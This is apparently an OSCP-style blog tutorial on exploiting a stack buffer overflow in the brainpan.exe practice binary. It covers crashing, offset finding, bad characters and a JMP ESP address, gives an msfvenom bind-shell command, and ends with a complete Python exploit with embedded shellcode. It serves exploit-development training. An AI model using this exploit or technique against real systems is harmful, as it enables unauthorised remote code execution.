---
layout: single
title: Stack-Based Buffer Overflow on Brainpan.exe
date: 2021-03-22
classes: wide
header:
  teaser: /assets/images/BOF/teaser.PNG
tags:
  - OSCP
  - Brainpan
  - Buffer Overflow
  - Binary exploitation
--- 

# Introduction

In this guide we'll be exploiting a very simple stack-based buffer overflow in the brainpan.exe binary on Windows 10. This guide assumes you have a very basic level of knowledge in using Immunity Debugger such as opening, starting and terminating programs. In addition, we will be using the mona tools for some parts so you'll need that installed too.

The brainpan binary can be downloaded from [here](https://github.com/freddiebarrsmith/Buffer-Overflow-Exploit-Development-Practice/raw/master/brainpan/brainpan.exe)

# Crashing

Firstly, open the brainpan binary and set it running in immunity. 

Second, connect to brainpan on its port (9999) using nc from your attacking machine and send a small amount of data.  

![use nc](/assets/images/BOF/nc-to-brainpan.PNG)

Once you have sent some data, check the binary and you'll see that your data has been copied into the buffer. 
 
![copied to buffer](/assets/images/BOF/copied-to-buffer.PNG)

Now, we need to send a lot of data and see if we can cause a crash. Use the skeleton script below to send 2000 "A" characters to the application. Change the local IP to match your current configurations.

```python
#!/usr/bin/env python

import socket,sys

address = '192.168.0.12'
port = 9999
A = "A" * 2000
B = "B" * 4
JMP = ""
NOP = "\x90"*20

buffer = A

try:
	print '[+] Sending buffer'
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.send(buffer)
except:
 	print '[!] Unable to connect to the application.'
 	sys.exit(0)
finally:
	s.close()
```

Execute the Python script `python ex.py` and you'll see that the application crashes and Immunity is showing an access violation. EIP has been overwritten with "41414141" which is the hex representation of "AAAA", we have a buffer overflow condition.

![send script](/assets/images/BOF/send-skel-1.PNG)

![access violation](/assets/images/BOF/41-access-vio.PNG)

## Finding a exact point of crash

Use the `pattern_create` tool to create a unique pattern 2000 characters long.

```bash
/usr/bin/msf-pattern_create -l 2000
```

This should generate a pattern like so

```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co
```

![pattern](/assets/images/BOF/create-pattern.PNG)

Copy the output from pattern_create into the Python script. Create a new variable called "pattern" to accommodate this and change the "buffer" variable to equal the "pattern" variable.

![pattern](/assets/images/BOF/pattern-in-python.PNG)

Reset Immunity Debugger and send the script again.

![send script](/assets/images/BOF/send-skel-1.PNG)

Notice now that the application has crashed and the EIP value is `35724134`

![pattern crash](/assets/images/BOF/pattern-crash.PNG)

Copy this value and use `pattern_offset` to find a match in the previous pattern. 

```bash
/usr/bin/msf-pattern_offset -l 2000 -q 35724134
```

The output from this command shows we have a match in the pattern at `524`. 

![pattern 524](/assets/images/BOF/524.PNG)

# Controlling EIP

Remove the "pattern" variable from the Python script and set the "buffer" variable to the "A" variable plus the "B" variable. Change A to be multiplied by 524 instead of 2000.

![python 524](/assets/images/BOF/Ax524.PNG)

Reset Immunity Debugger and send the script, see that EIP is now overwritten with `42424242` which is the hex representation of "BBBB", we now control the value of EIP.

![send script](/assets/images/BOF/send-skel-1.PNG)

![EIP is now 42424242](/assets/images/BOF/EIP-42.PNG)

# Finding bad characters

Copy the bad characters below into the scipt above the "address" variable. We don't need to include \x00 as this is automatically a bad character.

```
badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
```

![bad characters in python](/assets/images/BOF/badchars-in-python.PNG)

Set the "buffer" variable to also include the "badchars" variable then reset Immunity Debugger and send the script.

![bad characters in python](/assets/images/BOF/buffer-var-badchars.PNG)

![send script](/assets/images/BOF/send-skel-1.PNG)

Check Immunity and right click on the ESP register and "Follow In Dump".

![follow in dump](/assets/images/BOF/follow-in-dump.PNG)

Check the Stack window and copy from 01 to FF.

![copy badchars](/assets/images/BOF/copy-badchars.PNG)

Paste the badchars into a notepad document and manually evaluate the document for anomalies in the hex.

![copy badchars](/assets/images/BOF/badchars-in-notepad.PNG)

It looks like there are no bad characters except for \x00 which is always bad. This means we can use any character in our shellcode. If bad characters had been found then we would have to make sure not to include them in our shellcode.

You can remove the "badchars" variable from the script and reset the "buffer" to just equal A+B.

![reset script](/assets/images/BOF/script-reset.PNG)

# Finding a JMP ESP

Reset Immunity Debugger and type `!mona jmp -r esp` into the command window at the bottom left. 

![mona command](/assets/images/BOF/mona-command.PNG)

Once executed, go to the "Window" and choose "2 Log Data".

![log data](/assets/images/BOF/window-log-data.PNG)

See that mona has found us a JMP that's not using DEP or ASLR.

![JMP ESP](/assets/images/BOF/JMP.PNG)

The JMP we will be using is `311712F3`. We will need to convert this into little endian format which is backwards like this `\xF3\x12\x17\x31`. Add in the little endian JMP into the "JMP" variable.

![JMP in Python](/assets/images/BOF/JMP-in-python.PNG)

Change the "buffer" variable to equal "A+JMP+NOP".

![Buffer](/assets/images/BOF/buffer-A-JMP-NOP.PNG)

# Shellcode (Bind shell)

Generate some shellcode using msfvenom. I'm going to use a bind shell.

```
msfvenom -p windows/shell_bind_tcp lport=1111 EXITFUNC=thread -b '\x00' -f py
```

Copy the output into the script, above the "address" variable.

![Shellcode](/assets/images/BOF/shellcode-in-script.PNG)

Append the "buffer" variable with the "buf" variable containing our shellcode.

![Final buffer variable](/assets/images/BOF/final-buffer-var.PNG)

Reset Immunity Debugger and send the script.

![send script](/assets/images/BOF/send-skel-1.PNG)

Finally, connect to your bind shell on port 1111.

![bind shell](/assets/images/BOF/connect-to-bind-shell.PNG)

# Final exploit code 

Our final exploit code looks like this.

```
#!/usr/bin/env python

import socket,sys

buf =  b""
buf += b"\xda\xdc\xbe\x5f\xa5\x42\x34\xd9\x74\x24\xf4\x5f\x31"
buf += b"\xc9\xb1\x53\x31\x77\x17\x03\x77\x17\x83\xb0\x59\xa0"
buf += b"\xc1\xb2\x4a\xa7\x2a\x4a\x8b\xc8\xa3\xaf\xba\xc8\xd0"
buf += b"\xa4\xed\xf8\x93\xe8\x01\x72\xf1\x18\x91\xf6\xde\x2f"
buf += b"\x12\xbc\x38\x1e\xa3\xed\x79\x01\x27\xec\xad\xe1\x16"
buf += b"\x3f\xa0\xe0\x5f\x22\x49\xb0\x08\x28\xfc\x24\x3c\x64"
buf += b"\x3d\xcf\x0e\x68\x45\x2c\xc6\x8b\x64\xe3\x5c\xd2\xa6"
buf += b"\x02\xb0\x6e\xef\x1c\xd5\x4b\xb9\x97\x2d\x27\x38\x71"
buf += b"\x7c\xc8\x97\xbc\xb0\x3b\xe9\xf9\x77\xa4\x9c\xf3\x8b"
buf += b"\x59\xa7\xc0\xf6\x85\x22\xd2\x51\x4d\x94\x3e\x63\x82"
buf += b"\x43\xb5\x6f\x6f\x07\x91\x73\x6e\xc4\xaa\x88\xfb\xeb"
buf += b"\x7c\x19\xbf\xcf\x58\x41\x1b\x71\xf9\x2f\xca\x8e\x19"
buf += b"\x90\xb3\x2a\x52\x3d\xa7\x46\x39\x2a\x04\x6b\xc1\xaa"
buf += b"\x02\xfc\xb2\x98\x8d\x56\x5c\x91\x46\x71\x9b\xd6\x7c"
buf += b"\xc5\x33\x29\x7f\x36\x1a\xee\x2b\x66\x34\xc7\x53\xed"
buf += b"\xc4\xe8\x81\x98\xcc\x4f\x7a\xbf\x31\x2f\x2a\x7f\x99"
buf += b"\xd8\x20\x70\xc6\xf9\x4a\x5a\x6f\x91\xb6\x65\x8b\x35"
buf += b"\x3e\x83\xf9\xa9\x16\x1b\x95\x0b\x4d\x94\x02\x73\xa7"
buf += b"\x8c\xa4\x3c\xa1\x0b\xcb\xbc\xe7\x3b\x5b\x37\xe4\xff"
buf += b"\x7a\x48\x21\xa8\xeb\xdf\xbf\x39\x5e\x41\xbf\x13\x08"
buf += b"\xe2\x52\xf8\xc8\x6d\x4f\x57\x9f\x3a\xa1\xae\x75\xd7"
buf += b"\x98\x18\x6b\x2a\x7c\x62\x2f\xf1\xbd\x6d\xae\x74\xf9"
buf += b"\x49\xa0\x40\x02\xd6\x94\x1c\x55\x80\x42\xdb\x0f\x62"
buf += b"\x3c\xb5\xfc\x2c\xa8\x40\xcf\xee\xae\x4c\x1a\x99\x4e"
buf += b"\xfc\xf3\xdc\x71\x31\x94\xe8\x0a\x2f\x04\x16\xc1\xeb"
buf += b"\x24\xf5\xc3\x01\xcd\xa0\x86\xab\x90\x52\x7d\xef\xac"
buf += b"\xd0\x77\x90\x4a\xc8\xf2\x95\x17\x4e\xef\xe7\x08\x3b"
buf += b"\x0f\x5b\x28\x6e"

address = '192.168.0.12'
port = 9999
A = "A" * 524
B = "B" * 4
JMP = "\xF3\x12\x17\x31"
NOP = "\x90"*20

buffer = A+JMP+NOP+buf

try:
	print '[+] Sending buffer'
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.send(buffer)
except:
 	print '[!] Unable to connect to the application.'
 	sys.exit(0)
finally:
	s.close()
```
